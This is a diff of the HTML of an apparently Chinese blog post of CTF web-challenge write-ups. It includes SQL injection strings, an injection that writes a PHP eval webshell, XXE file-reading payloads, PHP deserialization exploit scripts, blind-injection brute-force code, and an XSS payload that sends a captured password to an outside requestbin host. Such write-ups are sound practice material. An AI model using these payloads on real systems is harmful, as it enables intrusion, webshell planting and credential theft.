+        <h2 id="HarekazeCTF2019-Avatar-Uploader-1"   >
+          <a href="#HarekazeCTF2019-Avatar-Uploader-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#HarekazeCTF2019-Avatar-Uploader-1" class="headerlink" title="[HarekazeCTF2019]Avatar Uploader 1"></a>[HarekazeCTF2019]Avatar Uploader 1</h2>
+      <p>传图片马不通过估计是因为<code>getimagesize</code>没有拿到大小信息，自己搞一个就行，上传发现啥也没得，就换了个头像，看源码咯</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
@@ -888,7 +581,10 @@ res <span class="token operator">=</span> <span class="token string">''</span>
 <p>1、文件经过<code>finfo_file</code>方法检测到的是PNG图片</p>
 <p>2、getimagesize函数返回图片信息，第三个元素不能等于IMAGETYPE_PNG，也就是不能为3</p>
 <p><code>finfo_file</code>方法是通过检测文件头的十六进制信息来判断文件类型的，那么我们一点点删除直到<code>finfo_file</code>能读出类型而<code>getimagesize</code>读不出内容即可</p>
-<h2 id="CISCN2019-华东南赛区-Web4"><a href="#CISCN2019-华东南赛区-Web4" class="headerlink" title="[CISCN2019 华东南赛区]Web4"></a>[CISCN2019 华东南赛区]Web4</h2><p>Read Something，传参读文件试试<code>/etc/passwd</code>读到了，那再读读环境文件吧<code>/proc/self/environ</code>，看到python文件位置，读源码</p>
+
+        <h2 id="CISCN2019-华东南赛区-Web4"   >
+          <a href="#CISCN2019-华东南赛区-Web4" class="heading-link"><i class="fas fa-link"></i></a><a href="#CISCN2019-华东南赛区-Web4" class="headerlink" title="[CISCN2019 华东南赛区]Web4"></a>[CISCN2019 华东南赛区]Web4</h2>
+      <p>Read Something，传参读文件试试<code>/etc/passwd</code>读到了，那再读读环境文件吧<code>/proc/self/environ</code>，看到python文件位置，读源码</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># encoding:utf-8</span>
 <span class="token keyword">import</span> re<span class="token punctuation">,</span> random<span class="token punctuation">,</span> uuid<span class="token punctuation">,</span> urllib
 <span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> session<span class="token punctuation">,</span> request
@@ -942,8 +638,11 @@ randStr <span class="token operator">=</span> <span class="token builtin">str</s
 <p>伪造session</p>
 <p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202205281141102.png"></p>
 <p>上传发现不行，寄了以后再来填坑</p>
-<h2 id="BSidesCF-2019-SVGMagic"><a href="#BSidesCF-2019-SVGMagic" class="headerlink" title="[BSidesCF 2019]SVGMagic"></a>[BSidesCF 2019]SVGMagic</h2><p>冷知识：SVG格式是由xml语法定义的</p>
-<p>关于SVG上传造成的漏洞可以看<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/323315064">这里</a></p>
+
+        <h2 id="BSidesCF-2019-SVGMagic"   >
+          <a href="#BSidesCF-2019-SVGMagic" class="heading-link"><i class="fas fa-link"></i></a><a href="#BSidesCF-2019-SVGMagic" class="headerlink" title="[BSidesCF 2019]SVGMagic"></a>[BSidesCF 2019]SVGMagic</h2>
+      <p>冷知识：SVG格式是由xml语法定义的</p>
+<p>关于SVG上传造成的漏洞可以看<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/323315064" >这里</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
 <p>所以自然联想到XXE漏洞</p>
 <p>构造payload</p>
 <pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
@@ -955,7 +654,10 @@ randStr <span class="token operator">=</span> <span class="token builtin">str</s
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>上传拿flag<del>环境似乎有问题，不管怎么传都会报错</del></p>
-<h2 id="N1CTF-2018-eating-cms"><a href="#N1CTF-2018-eating-cms" class="headerlink" title="[N1CTF 2018]eating_cms"></a>[N1CTF 2018]eating_cms</h2><p>扫出注册界面，注册登录，发现参数传递，尝试使用伪协议读取文件成功</p>
+
+        <h2 id="N1CTF-2018-eating-cms"   >
+          <a href="#N1CTF-2018-eating-cms" class="heading-link"><i class="fas fa-link"></i></a><a href="#N1CTF-2018-eating-cms" class="headerlink" title="[N1CTF 2018]eating_cms"></a>[N1CTF 2018]eating_cms</h2>
+      <p>扫出注册界面，注册登录，发现参数传递，尝试使用伪协议读取文件成功</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">//user.php
 <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"function.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -1156,7 +858,10 @@ include &quot;templates&#x2F;upload.html&quot;;
 
 <p>在这没有任何过滤，直接修改文件名就能执行系统命令</p>
 <p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206011611789.png"></p>
-<h2 id="FireshellCTF2020-Caas"><a href="#FireshellCTF2020-Caas" class="headerlink" title="[FireshellCTF2020]Caas"></a>[FireshellCTF2020]Caas</h2><p>试了试php和python代码，都编译失败，各种编程语言都尝试一下发现是C的编译器，你好世界试试</p>
+
+        <h2 id="FireshellCTF2020-Caas"   >
+          <a href="#FireshellCTF2020-Caas" class="heading-link"><i class="fas fa-link"></i></a><a href="#FireshellCTF2020-Caas" class="headerlink" title="[FireshellCTF2020]Caas"></a>[FireshellCTF2020]Caas</h2>
+      <p>试了试php和python代码，都编译失败，各种编程语言都尝试一下发现是C的编译器，你好世界试试</p>
 <pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
 int main() &#123;
     printf(&quot;Hello, World! \n&quot;);
@@ -1166,7 +871,10 @@ int main() &#123;
 <p>看wp知道是头文件包含报错，试试/etc/passwd，有回显</p>
 <p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206011632778.png"></p>
 <p>直接包含flag拿到</p>
-<h2 id="October-2019-Twice-SQL-Injection"><a href="#October-2019-Twice-SQL-Injection" class="headerlink" title="October 2019 Twice SQL Injection"></a>October 2019 Twice SQL Injection</h2><p>题目名字很明显了，二次注入，注入点在username处</p>
+
+        <h2 id="October-2019-Twice-SQL-Injection"   >
+          <a href="#October-2019-Twice-SQL-Injection" class="heading-link"><i class="fas fa-link"></i></a><a href="#October-2019-Twice-SQL-Injection" class="headerlink" title="October 2019 Twice SQL Injection"></a>October 2019 Twice SQL Injection</h2>
+      <p>题目名字很明显了，二次注入，注入点在username处</p>
 <pre class="line-numbers language-none"><code class="language-none">kkk&#39; union select database() #
 
 rua&#39; union select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;ctftraining&#39; #
@@ -1187,7 +895,10 @@ kkk&#39; union select flag from flag #<span aria-hidden="true" class="line-numbe
 <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select info from users where username='<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>';"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>可以看到从数据库中取出info数据的时候并没有对username进行addslash处理，会导致查询的是kkk这个用户的信息，但是我们并没有注册过这个用户，导致后面的union select执行，产生了二次注入漏洞</p>
-<h2 id="EIS-2019-EzPOP"><a href="#EIS-2019-EzPOP" class="headerlink" title="[EIS 2019]EzPOP"></a>[EIS 2019]EzPOP</h2><p>上来就给了源码，不错<del>不错个毛线啊md这什么玩意啊！！！！！！！！！</del></p>
+
+        <h2 id="EIS-2019-EzPOP"   >
+          <a href="#EIS-2019-EzPOP" class="heading-link"><i class="fas fa-link"></i></a><a href="#EIS-2019-EzPOP" class="headerlink" title="[EIS 2019]EzPOP"></a>[EIS 2019]EzPOP</h2>
+      <p>上来就给了源码，不错<del>不错个毛线啊md这什么玩意啊！！！！！！！！！</del></p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
@@ -1313,8 +1024,14 @@ kkk&#39; union select flag from flag #<span aria-hidden="true" class="line-numbe
 <span class="token punctuation">&#125;</span>
 <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="WMCTF2020-Make-PHP-Great-Again"><a href="#WMCTF2020-Make-PHP-Great-Again" class="headerlink" title="[WMCTF2020]Make PHP Great Again"></a>[WMCTF2020]Make PHP Great Again</h2><p>PHP最新版的小Trick， require_once包含的软链接层数较多时once的hash匹配会直接失效造成重复包含</p>
-<h2 id="极客大挑战-2020-Greatphp"><a href="#极客大挑战-2020-Greatphp" class="headerlink" title="[极客大挑战 2020]Greatphp"></a>[极客大挑战 2020]Greatphp</h2><p>先扔一个exp</p>
+
+        <h2 id="WMCTF2020-Make-PHP-Great-Again"   >
+          <a href="#WMCTF2020-Make-PHP-Great-Again" class="heading-link"><i class="fas fa-link"></i></a><a href="#WMCTF2020-Make-PHP-Great-Again" class="headerlink" title="[WMCTF2020]Make PHP Great Again"></a>[WMCTF2020]Make PHP Great Again</h2>
+      <p>PHP最新版的小Trick， require_once包含的软链接层数较多时once的hash匹配会直接失效造成重复包含</p>
+
+        <h2 id="极客大挑战-2020-Greatphp"   >
+          <a href="#极客大挑战-2020-Greatphp" class="heading-link"><i class="fas fa-link"></i></a><a href="#极客大挑战-2020-Greatphp" class="headerlink" title="[极客大挑战 2020]Greatphp"></a>[极客大挑战 2020]Greatphp</h2>
+      <p>先扔一个exp</p>
 <pre class="line-numbers language-none"><code class="language-none">&lt;?php
 error_reporting(0);
 class SYCLOVER &#123;
@@ -1342,7 +1059,10 @@ echo urlencode(serialize($c));
 
 
 
-<h2 id="SUCTF-2018-MultiSQL"><a href="#SUCTF-2018-MultiSQL" class="headerlink" title="[SUCTF 2018]MultiSQL"></a>[SUCTF 2018]MultiSQL</h2><p>注册登录，在头像处似乎有文件上传</p>
+
+        <h2 id="SUCTF-2018-MultiSQL"   >
+          <a href="#SUCTF-2018-MultiSQL" class="heading-link"><i class="fas fa-link"></i></a><a href="#SUCTF-2018-MultiSQL" class="headerlink" title="[SUCTF 2018]MultiSQL"></a>[SUCTF 2018]MultiSQL</h2>
+      <p>注册登录，在头像处似乎有文件上传</p>
 <p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206020934705.png"></p>
 <p>上传后发现任何文件都被重命名为jpg格式</p>
 <p>用户信息处有sql注入点，可使用堆叠注入</p>
@@ -1361,7 +1081,10 @@ print(&#39;)&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></spa
 <pre class="line-numbers language-none"><code class="language-none">2;set @a&#x3D;char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,107,107,107,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59);prepare query from @a;execute query;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>RCE拿flag</p>
-<h2 id="SWPU2019-Web4"><a href="#SWPU2019-Web4" class="headerlink" title="[SWPU2019]Web4"></a>[SWPU2019]Web4</h2><p>SQL注入，在username处放入单引号报错，但是再加上;就能执行，说明存在堆叠注入，先构造写shell语句发现无法写入，所以构造布尔注入语句</p>
+
+        <h2 id="SWPU2019-Web4"   >
+          <a href="#SWPU2019-Web4" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPU2019-Web4" class="headerlink" title="[SWPU2019]Web4"></a>[SWPU2019]Web4</h2>
+      <p>SQL注入，在username处放入单引号报错，但是再加上;就能执行，说明存在堆叠注入，先构造写shell语句发现无法写入，所以构造布尔注入语句</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token punctuation">,</span> time
 <span class="token keyword">import</span> json
 
@@ -1466,7 +1189,10 @@ flag <span class="token operator">=</span> <span class="token string">""</span>
 <pre class="line-numbers language-none"><code class="language-none">?r&#x3D;User&#x2F;Index&amp;img_file&#x3D;&#x2F;..&#x2F;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>图片处读base64解码即可</p>
-<h2 id="GXYCTF2019-BabysqliV3-0"><a href="#GXYCTF2019-BabysqliV3-0" class="headerlink" title="[GXYCTF2019]BabysqliV3.0"></a>[GXYCTF2019]BabysqliV3.0</h2><p>我tm试了半天你告诉我弱口令？？？？？？？？？？？？？？？？？？？？？？？？/</p>
+
+        <h2 id="GXYCTF2019-BabysqliV3-0"   >
+          <a href="#GXYCTF2019-BabysqliV3-0" class="heading-link"><i class="fas fa-link"></i></a><a href="#GXYCTF2019-BabysqliV3-0" class="headerlink" title="[GXYCTF2019]BabysqliV3.0"></a>[GXYCTF2019]BabysqliV3.0</h2>
+      <p>我tm试了半天你告诉我弱口令？？？？？？？？？？？？？？？？？？？？？？？？/</p>
 <p><code>admin/password</code><br><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206021103197.png"></p>
 <p>明显的文件读取，伪协议读取</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">//upload.php
@@ -1547,7 +1273,10 @@ flag <span class="token operator">=</span> <span class="token string">""</span>
 <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>上传后将name参数改为<code>phar:///var/www/html/uploads/da3fd6a2cf9c6007bda4c8a58e394ba2/GXY380513e563f39abb95bd589a6d2648ec.txt</code>刷新即可拿flag</p>
-<h2 id="SUCTF-2018-annonymous"><a href="#SUCTF-2018-annonymous" class="headerlink" title="[SUCTF 2018]annonymous"></a>[SUCTF 2018]annonymous</h2><p>源码</p>
+
+        <h2 id="SUCTF-2018-annonymous"   >
+          <a href="#SUCTF-2018-annonymous" class="heading-link"><i class="fas fa-link"></i></a><a href="#SUCTF-2018-annonymous" class="headerlink" title="[SUCTF 2018]annonymous"></a>[SUCTF 2018]annonymous</h2>
+      <p>源码</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token variable">$MY</span> <span class="token operator">=</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"die(`cat flag.php`);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建无名函数</span>
 <span class="token variable">$hash</span> <span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">openssl_random_pseudo_bytes</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//生成随机数</span>
@@ -1573,7 +1302,10 @@ flag <span class="token operator">=</span> <span class="token string">""</span>
         <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
         <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="RoarCTF-2019-Simple-Upload"><a href="#RoarCTF-2019-Simple-Upload" class="headerlink" title="[RoarCTF 2019]Simple Upload"></a>[RoarCTF 2019]Simple Upload</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
+
+        <h2 id="RoarCTF-2019-Simple-Upload"   >
+          <a href="#RoarCTF-2019-Simple-Upload" class="heading-link"><i class="fas fa-link"></i></a><a href="#RoarCTF-2019-Simple-Upload" class="headerlink" title="[RoarCTF 2019]Simple Upload"></a>[RoarCTF 2019]Simple Upload</h2>
+      <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
 <span class="token keyword">namespace</span> <span class="token package">Home<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span> 
 
 <span class="token keyword">use</span> <span class="token package">Think<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span> 
@@ -1643,7 +1375,10 @@ r <span class="token operator">=</span> requests<span class="token punctuation">
 <span class="token keyword">print</span> <span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>继续往下走，发现虽然php文件确实上传成功了，但是并没有返回文件名，看前后两个文件重命名后的内容发现文件名的生成是有规律的，了解后知道文件名是通过uniqid得到的，这是根据当前时间来得到的随机数，那么根据前后两个文件名不同的位置进行爆破即可</p>
-<h2 id="GoogleCTF2019-Quals-Bnv"><a href="#GoogleCTF2019-Quals-Bnv" class="headerlink" title="[GoogleCTF2019 Quals]Bnv"></a>[GoogleCTF2019 Quals]Bnv</h2><p>选择城市并且进行submit时会向api发送一个json格式的post请求，这里其实就有可能存在XXE注入</p>
+
+        <h2 id="GoogleCTF2019-Quals-Bnv"   >
+          <a href="#GoogleCTF2019-Quals-Bnv" class="heading-link"><i class="fas fa-link"></i></a><a href="#GoogleCTF2019-Quals-Bnv" class="headerlink" title="[GoogleCTF2019 Quals]Bnv"></a>[GoogleCTF2019 Quals]Bnv</h2>
+      <p>选择城市并且进行submit时会向api发送一个json格式的post请求，这里其实就有可能存在XXE注入</p>
 <p>在burp中尝试通过xml方式传入原始数据，提示未发现&lt;标签</p>
 <p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206061819430.png"></p>
 <p>按照xml格式构造内容提示没有DTD</p>
@@ -1654,7 +1389,7 @@ r <span class="token operator">=</span> requests<span class="token punctuation">
 <p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206061829146.png"></p>
 <p>那么下一步我们就要想如何构造才能让flag回显，我们先看是否能读取本地文件，提示文件虽然存在但并不是一个格式良好的xml文件，所以加载中断了，将/flag传入发现回显相同，说明flag文件存在，但是我们怎么读取呢？</p>
 <p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206061833299.png"></p>
-<p>一个利用本地DTD来XXE输出任何文件内容的小<a target="_blank" rel="noopener" href="https://mohemiv.com/tags/xxe/">trick</a></p>
+<p>一个利用本地DTD来XXE输出任何文件内容的小<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://mohemiv.com/tags/xxe/" >trick</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
 <blockquote>
 <p>本质上我们可以使用本地DTD文件的实体，但是我们需要在完全加载它之前对它进行定义</p>
 <p>而且Linux设备可能在/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd中有一个DTD文件。并且这个文件又一个名为ISOamsa的实体，所以我们可以使用它来写DTD代码。现在我们来制作DTD代码。</p>
@@ -1688,7 +1423,10 @@ r <span class="token operator">=</span> requests<span class="token punctuation">
 
 
 
-<h2 id="GWCTF-2019-mypassword"><a href="#GWCTF-2019-mypassword" class="headerlink" title="[GWCTF 2019]mypassword"></a>[GWCTF 2019]mypassword</h2><p>有反馈，合理怀疑XSS</p>
+
+        <h2 id="GWCTF-2019-mypassword"   >
+          <a href="#GWCTF-2019-mypassword" class="heading-link"><i class="fas fa-link"></i></a><a href="#GWCTF-2019-mypassword" class="headerlink" title="[GWCTF 2019]mypassword"></a>[GWCTF 2019]mypassword</h2>
+      <p>有反馈，合理怀疑XSS</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$feedback</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
 		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>alert('反馈不合法');&lt;/script>"</span><span class="token punctuation">;</span>
 		<span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
@@ -1713,7 +1451,10 @@ r <span class="token operator">=</span> requests<span class="token punctuation">
     docucookiement<span class="token punctuation">.</span>locacookietion<span class="token operator">=</span><span class="token string">"http://http.requestbin.buuoj.cn/1is06vp1/?a="</span><span class="token operator">+</span>psw<span class="token punctuation">;</span>
 <span class="token operator">&lt;</span><span class="token operator">/</span>scrcookieipt<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="DDCTF-2019-homebrew-event-loop"><a href="#DDCTF-2019-homebrew-event-loop" class="headerlink" title="[DDCTF 2019]homebrew event loop"></a>[DDCTF 2019]homebrew event loop</h2><p>欣赏源码</p>
+
+        <h2 id="DDCTF-2019-homebrew-event-loop"   >
+          <a href="#DDCTF-2019-homebrew-event-loop" class="heading-link"><i class="fas fa-link"></i></a><a href="#DDCTF-2019-homebrew-event-loop" class="headerlink" title="[DDCTF 2019]homebrew event loop"></a>[DDCTF 2019]homebrew event loop</h2>
+      <p>欣赏源码</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> session<span class="token punctuation">,</span> request<span class="token punctuation">,</span> Response
 <span class="token keyword">import</span> urllib
 
@@ -1892,12 +1633,18 @@ url_prefix <span class="token operator">=</span> <span class="token string">'/d5
 <p>看源码中各个函数的功能，写到注释中了，可以看到如果需要拿flag就要调用<code>get_flag_handler</code>，而如果要执行就需要有5个<code>num_items</code>，通过<code>buy_handler</code>函数来增加<code>num_items</code>，但是钱不够，此时我们通过执行<code>trigger_event</code>函数来进行多函数执行，在进行扣费之前就拿取到flag</p>
 <pre class="line-numbers language-none"><code class="language-none">?action:trigger_event#;action:buy;5#action:get_flag;#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>此时session已经被写入cookie了，由于该flask程序中并没有使用数据库，所以session中的内容实际上是储存在我们的cookie中（<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/client-session-security.html">戳这里看详情</a>）得到session内容并使用<code>flask-session-cookie-manager</code>工具进行解密，拿到flag</p>
-<h2 id="RootersCTF2019-babyWeb"><a href="#RootersCTF2019-babyWeb" class="headerlink" title="[RootersCTF2019]babyWeb"></a>[RootersCTF2019]babyWeb</h2><p>SQL注入，过滤已提醒<code>UNION SLEEP &#39; &quot; OR - BENCHMARK</code></p>
+<p>此时session已经被写入cookie了，由于该flask程序中并没有使用数据库，所以session中的内容实际上是储存在我们的cookie中（<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/client-session-security.html" >戳这里看详情</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>）得到session内容并使用<code>flask-session-cookie-manager</code>工具进行解密，拿到flag</p>
+
+        <h2 id="RootersCTF2019-babyWeb"   >
+          <a href="#RootersCTF2019-babyWeb" class="heading-link"><i class="fas fa-link"></i></a><a href="#RootersCTF2019-babyWeb" class="headerlink" title="[RootersCTF2019]babyWeb"></a>[RootersCTF2019]babyWeb</h2>
+      <p>SQL注入，过滤已提醒<code>UNION SLEEP &#39; &quot; OR - BENCHMARK</code></p>
 <p>先用order by测出列数，再用万能密码捞出flag</p>
 <pre class="line-numbers language-none"><code class="language-none">1 || 1&#x3D;1 limit 0,1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h2 id="HFCTF2020-BabyUpload"><a href="#HFCTF2020-BabyUpload" class="headerlink" title="[HFCTF2020]BabyUpload"></a>[HFCTF2020]BabyUpload</h2><p>源码先扔</p>
+
+        <h2 id="HFCTF2020-BabyUpload"   >
+          <a href="#HFCTF2020-BabyUpload" class="heading-link"><i class="fas fa-link"></i></a><a href="#HFCTF2020-BabyUpload" class="headerlink" title="[HFCTF2020]BabyUpload"></a>[HFCTF2020]BabyUpload</h2>
+      <p>源码先扔</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">session_save_path</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/var/babyctf/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -2004,9 +1751,12 @@ cookie <span class="token operator">=</span> <span class="token punctuation">&#1
 flag_res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookie<span class="token punctuation">)</span>
 <span class="token keyword">print</span><span class="token punctuation">(</span>flag_res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="NPUCTF2020-ezlogin"><a href="#NPUCTF2020-ezlogin" class="headerlink" title="[NPUCTF2020]ezlogin"></a>[NPUCTF2020]ezlogin</h2><p>XXE是你吗XXE</p>
+
+        <h2 id="NPUCTF2020-ezlogin"   >
+          <a href="#NPUCTF2020-ezlogin" class="heading-link"><i class="fas fa-link"></i></a><a href="#NPUCTF2020-ezlogin" class="headerlink" title="[NPUCTF2020]ezlogin"></a>[NPUCTF2020]ezlogin</h2>
+      <p>XXE是你吗XXE</p>
 <p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206111752709.png"></p>
-<p>尝试了一遍发现不是，看wp是<a target="_blank" rel="noopener" href="https://www.tr0y.wang/2019/05/11/XPath%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/">XPath注入</a>，还有一个<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7791">盲注</a></p>
+<p>尝试了一遍发现不是，看wp是<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.tr0y.wang/2019/05/11/XPath%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/" >XPath注入</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，还有一个<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7791" >盲注</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
 <p>XPath中表示内容的方法（类似Linux中的文件结构）</p>
 <pre class="line-numbers language-none"><code class="language-none">&#x2F; 根节点
 &#x2F;* 根结点下所有子节点
@@ -2070,7 +1820,10 @@ payload_password <span class="token operator">=</span><span class="token string"
         <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>跑出结果为adm1n和md5解密后为gtfly123，登录成功，发现传参中含有文件参数，尝试php伪协议读取，被拦截，大小写绕过，读取/flag</p>
-<h2 id="EasyBypass"><a href="#EasyBypass" class="headerlink" title="EasyBypass"></a>EasyBypass</h2><p>源码</p>
+
+        <h2 id="EasyBypass"   >
+          <a href="#EasyBypass" class="heading-link"><i class="fas fa-link"></i></a><a href="#EasyBypass" class="headerlink" title="EasyBypass"></a>EasyBypass</h2>
+      <p>源码</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 
 <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -2096,7 +1849,10 @@ payload_password <span class="token operator">=</span><span class="token string"
 <p>命令1，2过滤内容并不相同，命令1中过滤较少，直接从这边下手，首先双引号闭合，分号结束命令，tac读取文件，通配符匹配文件，最终payload如下</p>
